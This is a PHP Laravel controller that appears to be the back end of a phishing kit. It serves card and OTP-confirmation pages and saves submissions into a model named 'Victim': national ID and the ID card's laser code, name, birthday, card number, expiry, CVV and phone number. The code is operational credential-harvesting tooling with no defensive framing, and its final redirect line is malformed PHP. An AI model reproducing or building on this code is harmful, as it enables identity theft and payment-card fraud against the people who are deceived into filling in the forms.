<?php

namespace App\Http\Controllers;

use App\Models\Victim;
use Illuminate\Http\Request;

class formController extends Controller
{
    //
    public function index() {
        return view('newform');
    }

    public function oldform() {
        return view('form');
    }

    public function card() {
        return view('creditcard');
    }

    public function otp(){
        return view('confirm_otp');
    }

    public function info(){
        return view('info');
    }

    public function insert(Request $request) {
        $victim = new Victim;
        $victim->identification_number = $request->in_personal_id;
        $victim->first_name = $request->in_personal_fname;
        $victim->middle_name = $request->in_personal_mname;
        $victim->last_name = $request->in_personal_lname;
        $date = date_create($request['in_byear'].'-'.$request['in_bmonth'].'-'.$request['in_bday']);
        $victim->birthday = $date;
        $victim->laser_code = $request->in_back_personal_id;
        $victim->card_type = $request->in_card_type;
        $victim->name_on_card = $request->in_card_name;
        $victim->card_number = $request->in_card_id;
        $victim->date_expire = $request->in_card_expired;
        $victim['CVC/CVV'] = $request->in_card_cvv;
        $victim['telephone'] = $request->in_tel;
        $victim->save();
        return redirect().back();


    }
}
